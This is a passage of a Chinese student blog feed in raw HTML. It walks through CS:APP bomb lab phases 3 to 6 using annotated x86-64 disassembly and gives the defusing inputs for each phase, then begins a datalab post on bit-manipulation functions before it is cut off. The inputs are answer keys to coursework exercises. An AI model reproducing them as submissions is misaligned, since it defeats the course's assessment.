class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400f47</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx*sscanf第四个参数，即输入的第二个数<br>  <span class="hljs-attribute">400f4c</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx*sscanf第三个参数，即输入的第一个数<br>  <span class="hljs-attribute">400f51</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi*第二个参数<br>  <span class="hljs-attribute">400f56</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax*第一个参数<br>  <span class="hljs-attribute">400f5b</span>:e<span class="hljs-number">8</span> <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">400f60</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax*%eax会返回参数个数<br>  <span class="hljs-attribute">400f63</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">400</span>f<span class="hljs-number">6</span>a &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>&gt;*大于<span class="hljs-number">1</span>才继续，否则爆炸<br>  <span class="hljs-attribute">400f65</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">0</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f6a</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)<br>  <span class="hljs-attribute">400f6f</span>:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400</span>fad &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a&gt;<br>  <span class="hljs-attribute">400f71</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%eax<br>  <span class="hljs-attribute">400f75</span>:ff <span class="hljs-number">24</span> c<span class="hljs-number">5</span> <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>(,%rax,<span class="hljs-number">8</span>)<br>  <span class="hljs-attribute">400f7c</span>:b<span class="hljs-number">8</span> cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xcf,%eax<br>  <span class="hljs-attribute">400f81</span>:eb <span class="hljs-number">3</span>b                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f83</span>:b<span class="hljs-number">8</span> c<span class="hljs-number">3</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>c<span class="hljs-number">3</span>,%eax<br>  <span class="hljs-attribute">400f88</span>:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f8a</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">100</span>,%eax<br>  <span class="hljs-attribute">400f8f</span>:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f91</span>:b<span class="hljs-number">8</span> <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">185</span>,%eax<br>  <span class="hljs-attribute">400f96</span>:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f98</span>:b<span class="hljs-number">8</span> ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xce,%eax<br>  <span class="hljs-attribute">400f9d</span>:eb <span class="hljs-number">1</span>f                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f9f</span>:b<span class="hljs-number">8</span> aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>aa,%eax<br>  <span class="hljs-attribute">400fa4</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fa6</span>:b<span class="hljs-number">8</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">147</span>,%eax<br>  <span class="hljs-attribute">400fab</span>:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fad</span>:e<span class="hljs-number">8</span> <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fb2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400fb7</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fb9</span>:b<span class="hljs-number">8</span> <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">137</span>,%eax<br>  <span class="hljs-attribute">400fbe</span>:<span class="hljs-number">3</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0</span>xc(%rsp),%eax<br>  <span class="hljs-attribute">400fc2</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>fc<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">86</span>&gt;<br>  <span class="hljs-attribute">400fc4</span>:e<span class="hljs-number">8</span> <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fc9</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400fcd</span>:c<span class="hljs-number">3</span>                   retq    <br><br></code></pre></div></td></tr></table></figure></li><li><p><strong>指令思路与解决方法</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175426399.png" alt></p><p>这部分代码读入参数</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316174708562.png" alt="image-20210316174708562"></p><p>这部分代码先判断sscanf的参数个数返回值%eax是否大于1，大于继续，否则爆炸</p><p>在判断输入的第一个数字是否小于7，小于继续，否则爆炸。</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175205802.png" alt="image-20210316175205802"></p><p>这部分代码会跳转至M[0x402470+%rax*8]所在地址,</p><p>用gdb指令查看0x402470 处的值<img src="/posts/2ee63cf/image-20210316175832024.png" alt="image-20210316175832024"></p><p>通过观察可以发现，jump之后的指令都是功能类似的重复指令，因此我们只需选择一组跳转即可</p><p>因为0x402470 处的值即为jmpq后第一个mov指令所在地址，该操作会将0xcf(207)赋值给%eax。因此我们可以取第一个数为0，第二个数为207。因为之后的cmp会比较%eax的值和我们输入的第二个数，不相同会爆炸</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316180239126.png" alt="image-20210316180239126"></p><p>故密码可为：0 207或2 707等等，答案不唯一</p><p><img src="/posts/2ee63cf/image-20210316181230534.png" alt="image-20210316181230534"></p><p><img src="/posts/2ee63cf/image-20210316181134846.png" alt="image-20210316181134846"></p></li></ul><h2 id="4-phase_4"><a class="markdownIt-Anchor" href="#4-phase_4"></a> 4. phase_4</h2><ul><li><p><strong>汇编代码：</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204437370.png" alt="image-20210316204437370"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204525714.png" alt="image-20210316204525714"></p></li><li><p><strong>指令思路和解决方法：</strong></p><p>首先我们发现这还是和phase_3一样传入2参数，可以通过查看0x4025cf得知；</p><p>之后将第一个数字和0xe比较，如果小于等于就跳转，否则爆炸；</p><p>跳转后来到mov指令，赋值后：%edx=0xe,%esi=0x0，%edi=参数x<sub>1</sub>;之后调用函数func4()，可知前面三个寄存器存放函数func4的三个参数；</p><p>来到func4里，%eax经过mov指令后变成0xe，sub后保持不变，之后将%eax的值赋给%ecx, shr为将%ecx逻辑右移31位，%ecx=0;</p><p>sar无移位参数，默认右移一位，%eax=0x7;</p><p>lea:%ecx=%rax+%rsi*1=0x7+0*1=0x7;</p><p>之后将参数x<sub>1</sub>与%ecx比较，即0x7比较，若小于等于且大于等于则结束，且返回值%eax=0；否则将参数x<sub>1</sub>－1后继续调用func4。</p><p>回到phase_4，可知要使func4返回值为0，否则就会爆炸，所以当x1为7时恰好可以使返回值为0，符合；</p><p>之后很容易得到必须要使得第二个数为0，否则就会爆炸；</p><p>故密码为：7 0</p><p><img src="/posts/2ee63cf/image-20210316212318867.png" alt="image-20210316212318867"></p></li></ul><h2 id="5-phase_5"><a class="markdownIt-Anchor" href="#5-phase_5"></a> 5. phase_5</h2><ul><li><p><strong>汇编代码与指令思路</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000401062 &lt;phase_5&gt;:<br>  401062:53                   push   %rbx<br>  401063:48 83 ec 20          sub    $0x20,%rsp<br>  401067:48 89 fb             mov    %rdi,%rbx*将我们输入的传给%rdx<br>  40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>  401071:00 00 <br>  401073:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>  401078:31 c0                xor    %eax,%eax*重置%rax为0<br>  40107a:e8 9c 02 00 00       callq  40131b &lt;string_length&gt;*判断长度<br>  40107f:83 f8 06             cmp    $0x6,%eax<br>  401082:74 4e                je     4010d2 &lt;phase_5+0x70&gt;*不为6则爆炸<br>  401084:e8 b1 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401089:eb 47                jmp    4010d2 &lt;phase_5+0x70&gt;<br>  40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx<br>  40108f:88 0c 24             mov    %cl,(%rsp)<br>  401092:48 8b 14 24          mov    (%rsp),%rdx*1.上述三个操作将我们输入的字符的低四位传给%rdx<br>  401096:83 e2 0f             and    $0xf,%edx<br>  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx*2.将%rdx的值作为偏移量，取内存中的M[0x4024b0+%rdx]的值<br>  4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)*取出来的字符存到后面的地址中<br>  4010a4:48 83 c0 01          add    $0x1,%rax*将上述操作重复6次<br>  4010a8:48 83 f8 06          cmp    $0x6,%rax<br>  4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;<br>  4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)<br>  4010b3:be 5e 24 40 00       mov    $0x40245e,%esi<br>  4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi*将取出来的6个字符存到%rdi中<br>  4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;*与0x40245e地址中值比较，不相等就会爆炸<br>  4010c2:85 c0                test   %eax,%eax<br>  4010c4:74 13                je     4010d9 &lt;phase_5+0x77&gt;<br>  4010c6:e8 6f 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4010cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)<br>  4010d0:eb 07                jmp    4010d9 &lt;phase_5+0x77&gt;<br>  4010d2:b8 00 00 00 00       mov    $0x0,%eax<br>  4010d7:eb b2                jmp    40108b &lt;phase_5+0x29&gt;<br>  4010d9:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>  4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>  4010e5:00 00 <br>  4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;<br>  4010e9:e8 42 fa ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;<br>  4010ee:48 83 c4 20          add    $0x20,%rsp<br>  4010f2:5b                   pop    %rbx<br>  4010f3:c3                   retq  <br></code></pre></div></td></tr></table></figure></li><li><p><strong>解决方法：</strong></p><p>上述指令简而言之就是我们输入6个字符，然后取这6个字符的后4位作为地址索引，取内存中的M[0x4024b0+%rdx]的值，存到另一个寄存器中，然后将这个值与M[0x40245e]中的值比较，相等则结束，否则爆炸；</p><p>所以我们先查看内存0x4024b0为起始的地址中存放的元素：</p><p><img src="/posts/2ee63cf/image-20210317085034624.png" alt="image-20210317085034624"></p><p>然后查看0x40245e中的值：</p><p><img src="/posts/2ee63cf/image-20210317085132914.png" alt="image-20210317085132914"></p><p>然后在上一个字符串中查看后一个字符串对应的下标，很容易得到下标分别为：9  15  14  5  6  7</p><p>这六个数低四位的16进制为：0x9  0xf  0xe 0x5 0x6  0x7</p><p>查看ASSCI表可知9?n567或  9?&gt;567都可以。</p><p>所以密码可以为9?n567或  9?&gt;567等等，答案不唯一</p><p><img src="/posts/2ee63cf/image-20210317090128611.png" alt="image-20210317090128611"></p></li></ul><h2 id="6-phase_6"><a class="markdownIt-Anchor" href="#6-phase_6"></a> 6. phase_6</h2><ul><li><p>汇编代码和指令思路</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">00000000004010f4 &lt;phase_6&gt;:<br>  4010f4:41 56                push   %r14<br>  4010f6:41 55                push   %r13<br>  4010f8:41 54                push   %r12<br>  4010fa:55                   push   %rbp<br>  4010fb:53                   push   %rbx<br>  4010fc:48 83 ec 50          sub    $0x50,%rsp<br>  401100:49 89 e5             mov    %rsp,%r13<br>  401103:48 89 e6             mov    %rsp,%rsi<br>  401106:e8 51 03 00 00       callq  40145c &lt;read_six_numbers&gt;*读取六个数字<br>  40110b:49 89 e6             mov    %rsp,%r14<br>  40110e:41 bc 00 00 00 00    mov    $0x0,%r12d<br>  401114:4c 89 ed             mov    %r13,%rbp<br>  401117:41 8b 45 00          mov    0x0(%r13),%eax<br>  40111b:83 e8 01             sub    $0x1,%eax<br>  40111e:83 f8 05             cmp    $0x5,%eax<br>  401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;*第一个循环，判断a[0]&lt;=6,是继续，否则爆炸<br>  401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401128:41 83 c4 01          add    $0x1,%r12d*%r12d为第一个循环计数器<br>  40112c:41 83 fc 06          cmp    $0x6,%r12d<br>  401130:74 21                je     401153 &lt;phase_6+0x5f&gt;*终止条件，六次后结束<br>  401132:44 89 e3             mov    %r12d,%ebx<br>  401135:48 63 c3             movslq %ebx,%rax<br>  401138:8b 04 84             mov    (%rsp,%rax,4),%eax<br>  40113b:39 45 00             cmp    %eax,0x0(%rbp)<br>  40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;*第二个循环，a[i++],依次和a[0]比较，相同则爆炸<br>  401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401145:83 c3 01             add    $0x1,%ebx*%ebx为第二个循环计数器，计数5次<br>  401148:83 fb 05             cmp    $0x5,%ebx<br>  40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;<br>  40114d:49 83 c5 04          add    $0x4,%r13*结合这行，第一个循环就是判断每个数都小于等于6<br>  401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;<br>  401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi<br>  401158:4c 89 f0             mov    %r14,%rax<br>  40115b:b9 07 00 00 00       mov    $0x7,%ecx<br>  401160:89 ca                mov    %ecx,%edx<br>  401162:2b 10                sub    (%rax),%edx<br>  401164:89 10                mov    %edx,(%rax)<br>  401166:48 83 c0 04          add    $0x4,%rax<br>  40116a:48 39 f0             cmp    %rsi,%rax<br>  40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;*第三层循环之后，a[i]=7-a[i] <br>  40116f:be 00 00 00 00       mov    $0x0,%esi<br>  401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;<br>  401176:48 8b 52 08          mov    0x8(%rdx),%rdx<br>  40117a:83 c0 01             add    $0x1,%eax<br>  40117d:39 c8                cmp    %ecx,%eax<br>  40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;<br>  401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;<br>  401183:ba d0 32 60 00       mov    $0x6032d0,%edx<br>  401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)<br>  40118d:48 83 c6 04          add    $0x4,%rsi<br>  401191:48 83 fe 18          cmp    $0x18,%rsi<br>  401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;<br>  401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx<br>  40119a:83 f9 01             cmp    $0x1,%ecx<br>  40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;<br>  40119f:b8 01 00 00 00       mov    $0x1,%eax<br>  4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx*存放链表结点数值的起始地址<br>  4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;<br>  4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx<br>  4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax<br>  4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi<br>  4011ba:48 89 d9             mov    %rbx,%rcx<br>  4011bd:48 8b 10             mov    (%rax),%rdx<br>  4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)<br>  4011c4:48 83 c0 08          add    $0x8,%rax<br>  4011c8:48 39 f0             cmp    %rsi,%rax<br>  4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;<br>  4011cd:48 89 d1             mov    %rdx,%rcx<br>  4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;*确定链表数字为降序排序<br>  4011d2:48 c7 42 08 00 00 00 movq   $0x0,0x8(%rdx)<br>  4011d9:00 <br>  4011da:bd 05 00 00 00       mov    $0x5,%ebp<br>  4011df:48 8b 43 08          mov    0x8(%rbx),%rax<br>  4011e3:8b 00                mov    (%rax),%eax<br>  4011e5:39 03                cmp    %eax,(%rbx)<br>  4011e7:7d 05                jge    4011ee &lt;phase_6+0xfa&gt;<br>  4011e9:e8 4c 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4011ee:48 8b 5b 08          mov    0x8(%rbx),%rbx<br>  4011f2:83 ed 01             sub    $0x1,%ebp<br>  4011f5:75 e8                jne    4011df &lt;phase_6+0xeb&gt;<br>  4011f7:48 83 c4 50          add    $0x50,%rsp<br>  4011fb:5b                   pop    %rbx<br>  4011fc:5d                   pop    %rbp<br>  4011fd:41 5c                pop    %r12<br>  4011ff:41 5d                pop    %r13<br>  401201:41 5e                pop    %r14<br>  401203:c3                   retq  <br></code></pre></div></td></tr></table></figure></li><li><p><strong>解决思路：</strong></p><p>上述代码思路概括就是将链表结点数值按照降序排序，其对应的数值即为顺序，最后a[i]=7-a[i]，即为我们要输入的值。</p><p>首先我们用gdb指令查看链表的数据：</p><p><img src="/posts/2ee63cf/image-20210317104905959.png" alt="image-20210317104905959"></p><p>这六个数字按照降序排列对应的编码顺序为：3  4  5  6  1  2</p><p>运算后即为：4 3 2 1 6 5</p><p>故密码为：4 3 2 1 6 5</p><p><img src="/posts/2ee63cf/image-20210317105113068.png" alt="image-20210317105113068"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统Lab2-datalab</title>
    <link href="/posts/330a79db/"/>
    <url>/posts/330a79db/</url>
    
    <content type="html"><![CDATA[<h1 id="lab2_datalab"><a class="markdownIt-Anchor" href="#lab2_datalab"></a> lab2_datalab</h1><h2 id="1bitand"><a class="markdownIt-Anchor" href="#1bitand"></a> 1.bitAnd</h2><p>这个很简单</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * bitAnd - x&amp;y using only ~ and | </span><br><span class="hljs-comment"> *   Example: bitAnd(6, 5) = 4</span><br><span class="hljs-comment"> *   Legal ops: ~ |</span><br><span class="hljs-comment"> *   Max ops: 8</span><br><span class="hljs-comment"> *   Rating: 1</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bitAnd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;<br><br>  <span class="hljs-keyword">return</span> ~(~x|~y);<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="2getbyte"><a class="markdownIt-Anchor" href="#2getbyte"></a> 2.getByte</h2><p>舍掉最后的n个字节，即n*8位，并保留舍掉后的最后8位</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * getByte - Extract byte n from word x</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Examples: getByte(0x12345678,1) = 0x56</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Max ops: 6</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> * Rating: 2</span><br><span class="hljs-comment">    */</span><br>   <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getByte</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>   <span class="hljs-keyword">int</span> tmp =x&gt;&gt;(n&lt;&lt;<span class="hljs-number">3</span>);<span class="hljs-comment">//将目标移到最后</span><br>   tmp=tmp&amp;<span class="hljs-number">0xFF</span>;<span class="hljs-comment">//保留目标</span><br>   <span class="hljs-keyword">return</span> tmp;<br>   &#125;<br></code></pre></div></td></tr></table></figure><h2 id="3logicalshift"><a class="markdownIt-Anchor" href="#3logicalshift"></a> 3.logicalShift</h2><p>对x进行逻辑右移（算术右移补符号位，逻辑右移补0），可以采用先进行算术右移，然后将右移多出来的符号位置0。</p><p>因为不能使用减号，所以将1左移31位后采用先右移n,再左移1位的方法，最后取反。</p><p>与算术右移进行与即可得到结果</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * logicalShift - shift 